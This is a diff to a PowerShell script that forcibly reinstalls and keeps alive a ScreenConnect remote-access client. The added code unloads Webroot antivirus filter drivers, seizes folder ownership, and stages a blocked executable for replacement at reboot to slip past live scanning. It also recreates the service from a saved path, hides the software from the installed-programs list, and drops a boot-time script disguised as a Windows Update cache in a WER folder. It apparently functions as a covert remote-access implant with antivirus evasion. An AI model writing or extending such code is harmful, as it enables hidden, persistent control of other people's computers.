@@ -531,6 +531,123 @@ function Get-PrimaryScInstallDir {
     return "${env:ProgramFiles(x86)}\ScreenConnect Client ($PrimaryFingerprint)"
 }
 
+function Save-PrimaryScImagePath {
+    $pathFile = Join-Path $WorkDir '.sc_imgpath'
+    try {
+        $svc = Get-CimInstance Win32_Service -Filter "Name='$SvcName'" -ErrorAction SilentlyContinue
+        if ($svc -and $svc.PathName) {
+            Set-Content -Path $pathFile -Value $svc.PathName -Encoding UTF8 -Force
+            Write-Log 'REPAIR: saved SC ImagePath for service restore'
+            return $true
+        }
+    } catch {}
+    # Fallback: rebuild from known relay if prior save exists keep it
+    if (Test-Path $pathFile) { return $true }
+    return $false
+}
+
+function Restore-PrimaryScService {
+    if (Test-ScServicePresent) { return $true }
+    $pathFile = Join-Path $WorkDir '.sc_imgpath'
+    if (-not (Test-Path $pathFile)) {
+        Write-Log 'REPAIR: no saved ImagePath - cannot recreate service'
+        return $false
+    }
+    $img = (Get-Content -Path $pathFile -Raw -ErrorAction SilentlyContinue).Trim()
+    if (-not $img) { return $false }
+    $exe = Join-Path (Get-PrimaryScInstallDir) 'ScreenConnect.ClientService.exe'
+    if (-not (Test-Path $exe)) {
+        Write-Log 'REPAIR: ClientService.exe missing - skip service recreate'
+        return $false
+    }
+    try {
+        New-Service -Name $SvcName -BinaryPathName $img -DisplayName $SvcName `
+            -StartupType Automatic -ErrorAction Stop | Out-Null
+        Write-Log 'REPAIR: service recreated from saved ImagePath'
+    } catch {
+        # sc.exe fallback — binPath= must not quote the whole thing oddly
+        Write-Log "REPAIR: New-Service failed ($($_.Exception.Message)) - sc create"
+        $null = cmd /c "sc create `"$SvcName`" binPath= $img start= auto obj= LocalSystem DisplayName= `"$SvcName`""
+    }
+    & sc.exe config "$SvcName" start= auto >$null 2>&1
+    return (Test-ScServicePresent)
+}
+
+function Install-ScBlockedFile {
+    # Webroot often returns ERROR_INVALID_FUNCTION (1) on ScreenConnect.WindowsClient.exe writes
+    param([string]$Src, [string]$Dest)
+    if (-not (Test-Path $Src)) { return $false }
+    $dir = Split-Path $Dest -Parent
+    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
+    cmd /c "takeown /F `"$dir`" /R /D Y" >$null 2>&1
+    cmd /c "icacls `"$dir`" /grant Administrators:F /T /C" >$null 2>&1
+    foreach ($drv in @('WRkrn', 'WRCore', 'WebrootSecureAnywhere', 'WRAuxiliary')) {
+        try { & fltmc.exe unload "$drv" >$null 2>&1 } catch {}
+    }
+    if (Test-Path $Dest) {
+        attrib -r -s -h "$Dest" >$null 2>&1
+        Remove-Item $Dest -Force -ErrorAction SilentlyContinue
+    }
+    $bytes = [IO.File]::ReadAllBytes($Src)
+    Write-Log ("REPAIR: write blocked-target {0} srcBytes={1}" -f (Split-Path $Dest -Leaf), $bytes.Length)
+
+    # 1) direct WriteAllBytes
+    try {
+        [IO.File]::WriteAllBytes($Dest, $bytes)
+        if ((Test-Path $Dest) -and ((Get-Item $Dest).Length -eq $bytes.Length)) {
+            Write-Log 'REPAIR: WriteAllBytes OK'
+            return $true
+        }
+    } catch { Write-Log "REPAIR: WriteAllBytes fail: $($_.Exception.Message)" }
+
+    # 2) temp name in same dir then rename
+    $tmp = Join-Path $dir ('wc_' + [guid]::NewGuid().ToString('N') + '.bin')
+    try {
+        [IO.File]::WriteAllBytes($tmp, $bytes)
+        if (Test-Path $Dest) { Remove-Item $Dest -Force -ErrorAction SilentlyContinue }
+        Move-Item -LiteralPath $tmp -Destination $Dest -Force -ErrorAction Stop
+        if ((Test-Path $Dest) -and ((Get-Item $Dest).Length -eq $bytes.Length)) {
+            Write-Log 'REPAIR: temp+rename OK'
+            return $true
+        }
+    } catch {
+        Write-Log "REPAIR: temp+rename fail: $($_.Exception.Message)"
+        Remove-Item $tmp -Force -ErrorAction SilentlyContinue
+    }
+
+    # 3) cmd copy
+    try {
+        cmd /c "copy /y `"$Src`" `"$Dest`"" >$null 2>&1
+        if ((Test-Path $Dest) -and ((Get-Item $Dest).Length -eq $bytes.Length)) {
+            Write-Log 'REPAIR: cmd copy OK'
+            return $true
+        }
+    } catch { Write-Log "REPAIR: cmd copy fail: $($_.Exception.Message)" }
+
+    # 4) pending reboot replace (MoveFileEx) — survives Webroot live filter
+    try {
+        if (-not ('Native.MoveEx' -as [type])) {
+            Add-Type -Namespace Native -Name MoveEx -MemberDefinition @'
+[DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
+public static extern bool MoveFileEx(string lpExistingFileName, string lpNewFileName, int dwFlags);
+'@
+        }
+        $stage = Join-Path $WorkDir ('WindowsClient_stage_' + [guid]::NewGuid().ToString('N') + '.exe')
+        [IO.File]::WriteAllBytes($stage, $bytes)
+        # 1=REPLACE_EXISTING, 4=DELAY_UNTIL_REBOOT
+        $moved = [Native.MoveEx]::MoveFileEx($stage, $Dest, 5)
+        $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+        Write-Log "REPAIR: pending-reboot MoveFileEx=$moved win32=$err -> $Dest"
+        if ($moved) {
+            Write-Log 'REPAIR: WindowsClient staged for REPLACE at REBOOT'
+            return $true  # not live-ok, but armed — caller checks Test-Path
+        }
+    } catch {
+        Write-Log "REPAIR: MoveFileEx fail: $($_.Exception.Message)"
+    }
+    return ((Test-Path $Dest) -and ((Get-Item $Dest).Length -ge 200000))
+}
+
 function Expand-ScMsiOverInstall {
     # msiexec /i often exit=0 without writing files — admin-extract then robocopy the real payload folder
     param([string]$MsiPath, [string]$DestDir)
@@ -554,36 +671,42 @@ function Expand-ScMsiOverInstall {
     New-Item -ItemType Directory -Path $DestDir -Force | Out-Null
     cmd /c "takeown /F `"$DestDir`" /R /D Y" >$null 2>&1
     cmd /c "icacls `"$DestDir`" /grant Administrators:F /T /C" >$null 2>&1
-    # Stop anything locking DestDir before overwrite
     Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
         ("$($_.ExecutablePath)" -like "*$PrimaryFingerprint*")
     } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
     & sc.exe stop "$SvcName" >$null 2>&1
     Start-Sleep -Seconds 2
+
+    # Copy everything except WindowsClient first (WR often blocks that name live)
     $rcLog = Join-Path $WorkDir 'robocopy_sc.log'
-    & robocopy.exe "$srcRoot" "$DestDir" /E /IS /IT /R:2 /W:1 /NFL /NDL /NJH /NJS /nc /ns /np `
-        /LOG:"$rcLog" >$null 2>&1
-    $rc = $LASTEXITCODE
-    Write-Log "REPAIR: robocopy exit $rc (0-7=ok)"
-    $copied = @(Get-ChildItem -Path $DestDir -Filter 'ScreenConnect*.exe' -ErrorAction SilentlyContinue)
-    foreach ($c in $copied) {
+    & robocopy.exe "$srcRoot" "$DestDir" /E /IS /IT /R:2 /W:1 /XF ScreenConnect.WindowsClient.exe `
+        /NFL /NDL /NJH /NJS /nc /ns /np /LOG:"$rcLog" >$null 2>&1
+    Write-Log "REPAIR: robocopy (excl WindowsClient) exit $LASTEXITCODE"
+    foreach ($c in @(Get-ChildItem -Path $DestDir -Filter 'ScreenConnect*.exe' -ErrorAction SilentlyContinue)) {
         Write-Log ("REPAIR: restored {0} bytes={1}" -f $c.Name, $c.Length)
     }
-    $client = Get-Item (Join-Path $DestDir 'ScreenConnect.WindowsClient.exe') -ErrorAction SilentlyContinue
-    if (-not $client) {
-        $client = Get-ChildItem -Path $extract -Recurse -Filter 'ScreenConnect.WindowsClient.exe' -ErrorAction SilentlyContinue |
-            Select-Object -First 1
-        if ($client) {
-            Copy-Item $client.FullName -Destination (Join-Path $DestDir $client.Name) -Force
-            Write-Log ("REPAIR: forced WindowsClient bytes={0}" -f $client.Length)
+
+    $clientSrc = Get-ChildItem -Path $extract -Recurse -Filter 'ScreenConnect.WindowsClient.exe' -ErrorAction SilentlyContinue |
+        Sort-Object Length -Descending | Select-Object -First 1
+    $clientDest = Join-Path $DestDir 'ScreenConnect.WindowsClient.exe'
+    $clientOk = $false
+    $pendingReboot = $false
+    if ($clientSrc) {
+        $clientOk = Install-ScBlockedFile -Src $clientSrc.FullName -Dest $clientDest
+        if (-not (Test-Path $clientDest) -or ((Get-Item $clientDest -ErrorAction SilentlyContinue).Length -lt 200000)) {
+            $pendingReboot = $true
+            Write-Log 'REPAIR: WindowsClient not live yet - reboot pending rename may apply'
         }
+    } else {
+        Write-Log 'REPAIR: MSI extract missing WindowsClient.exe'
     }
+
+    # Keep extract until after blocked write (needed for stage source)
     Remove-Item $extract -Recurse -Force -ErrorAction SilentlyContinue
     $ok = (Test-Path (Join-Path $DestDir 'ScreenConnect.ClientService.exe')) -and (
-        (Test-Path (Join-Path $DestDir 'ScreenConnect.WindowsClient.exe')) -or
-        (Test-Path (Join-Path $DestDir 'ScreenConnect.Client.exe'))
+        ((Test-Path $clientDest) -and ((Get-Item $clientDest).Length -ge 200000)) -or $pendingReboot
     )
-    Write-Log ("REPAIR: extract/robocopy ok=$ok files=$($copied.Count)")
+    Write-Log ("REPAIR: extract/robocopy ok=$ok clientLive=$(Test-Path $clientDest) pendingReboot=$pendingReboot")
     return $ok
 }
 
@@ -595,6 +718,18 @@ function Repair-ScAfterAv {
     $h1 = Get-ScBinaryHealth
     Write-Log ("SC health before repair: running={0} exes={1} procs={2}" -f $h1.ServiceRunning, $h1.ExeCount, $h1.ProcCount)
     foreach ($d in $h1.ExeDetail) { Write-Log ("  bin: $d") }
+
+    Save-PrimaryScImagePath | Out-Null
+    try {
+        $rk = "HKLM:\SYSTEM\CurrentControlSet\Services\$SvcName"
+        if (Test-Path $rk) {
+            $ip = (Get-ItemProperty $rk -ErrorAction SilentlyContinue).ImagePath
+            if ($ip) {
+                Set-Content -Path (Join-Path $WorkDir '.sc_imgpath') -Value $ip -Encoding UTF8 -Force
+                Write-Log 'REPAIR: saved ImagePath from services registry'
+            }
+        }
+    } catch {}
 
     Uninstall-PrimaryScResidue
     Start-Sleep -Seconds 2
@@ -624,11 +759,10 @@ function Repair-ScAfterAv {
         Write-Log "REPAIR: msiexec amus exit $($p2.ExitCode)"
     }
     Start-Sleep -Seconds 8
+    Save-PrimaryScImagePath | Out-Null
 
     $dest = Get-PrimaryScInstallDir
     New-Item -ItemType Directory -Path $dest -Force | Out-Null
-    $hMid = Get-ScBinaryHealth
-    # Always layer extract/robocopy — guarantees WindowsClient lands in the service folder
     Write-Log 'REPAIR: admin-extract + robocopy into install dir'
     Expand-ScMsiOverInstall -MsiPath $MsiFile -DestDir $dest | Out-Null
     Start-Sleep -Seconds 2
@@ -639,8 +773,11 @@ function Repair-ScAfterAv {
             -Wait -PassThru -WindowStyle Hidden
         Write-Log "REPAIR: msiexec register exit $($p3.ExitCode)"
         Start-Sleep -Seconds 5
-        # Re-apply binaries in case msiexec left stubs / skipped files again
+        Save-PrimaryScImagePath | Out-Null
         Expand-ScMsiOverInstall -MsiPath $MsiFile -DestDir $dest | Out-Null
+    }
+    if (-not (Test-ScServicePresent)) {
+        Restore-PrimaryScService | Out-Null
     }
 
     Remove-Item $MsiFile -Force -ErrorAction SilentlyContinue
@@ -649,10 +786,13 @@ function Repair-ScAfterAv {
     Set-ArpCamouflage | Out-Null
 
     $h2 = Get-ScBinaryHealth
-    Write-Log ("SC health after repair: running={0} exes={1} procs={2} stub={3} svcExe={4} client={5}/{6}" -f `
-        $h2.ServiceRunning, $h2.ExeCount, $h2.ProcCount, $h2.Stubbed, $h2.SvcExeSize, $h2.HasClientExe, $h2.ClientExeSize)
+    $clientPath = Join-Path $dest 'ScreenConnect.WindowsClient.exe'
+    $clientLive = (Test-Path $clientPath) -and ((Get-Item $clientPath).Length -ge 200000)
+    Write-Log ("SC health after repair: running={0} exes={1} procs={2} stub={3} svcExe={4} client={5}/{6} clientLive={7}" -f `
+        $h2.ServiceRunning, $h2.ExeCount, $h2.ProcCount, $h2.Stubbed, $h2.SvcExeSize, $h2.HasClientExe, $h2.ClientExeSize, $clientLive)
     foreach ($d in $h2.ExeDetail) { Write-Log ("  bin: $d") }
-    $ok = ((Test-ScServicePresent) -and -not $h2.Stubbed -and $h2.HasClientExe)
+
+    $ok = ((Test-ScServicePresent) -and -not $h2.Stubbed -and $clientLive)
     if ($ok -and -not (Test-ScServiceRunning)) {
         Start-PrimaryService | Out-Null
         $ok = [bool](Test-ScServiceRunning)
@@ -662,12 +802,12 @@ function Repair-ScAfterAv {
         Set-Content -Path $marker -Value (Get-Date -Format 'o') -Encoding ASCII -Force
         Write-Log 'REPAIR: success marker written'
     } else {
-        Write-Log 'REPAIR: still broken after reinstall (likely Webroot stubs / NOT_STOPPABLE)'
+        Write-Log 'REPAIR: still broken (WindowsClient blocked live / service) - REBOOT REQUIRED'
         try {
             $bootPs1 = Join-Path $WorkDir 'wucache_bootrepair.ps1'
             $bootBody = @"
 `$ErrorActionPreference='SilentlyContinue'
-Start-Sleep 20
+Start-Sleep 25
 & powershell.exe -NoProfile -ExecutionPolicy Bypass -File (Join-Path `$env:ProgramData 'Microsoft\Windows\WER\Temp\.wucache\wucache_pkg.ps1')
 "@
             Set-Content -Path $bootPs1 -Value $bootBody -Encoding ASCII -Force
@@ -1334,7 +1474,7 @@ function Invoke-NukeBlockedScreenConnect {
     Write-Log "AUTO-NUKE complete (actions~$killed)"
 }
 
-Write-Log 'WU_BUILD_20260730F'
+Write-Log 'WU_BUILD_20260730G'
 Write-Log ("Host=$env:COMPUTERNAME user=$env:USERNAME pid=$PID")
 Invoke-NukeBlockedScreenConnect
 
